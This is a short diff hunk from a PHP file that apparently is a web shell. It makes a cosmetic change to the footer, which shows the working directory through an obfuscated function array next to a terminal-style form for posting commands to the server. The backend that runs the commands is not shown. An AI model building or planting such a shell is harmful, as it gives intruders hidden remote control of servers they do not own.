@@ -210,7 +210,7 @@ $xpl = explode("-", $exp[2]);
         </div>
         <div class="footer">
             <div class="pwd bg-dark p-2 text-light">
-                <b>PWD : </b><span><?= $fungsi[9](); ?></span>
+                <b>PWD : </b><strong><?= $fungsi[9](); ?></strong>
             </div>
             <form action="" method="post">
                 <input type="text" name="value" id="form-header" class="form-terminal" placeholder="<?= $_SERVER['SERVER_NAME']; ?>@terminal~#:" autofocus><input type="submit" value=">" class="form-submit bg-dark" name="submit">
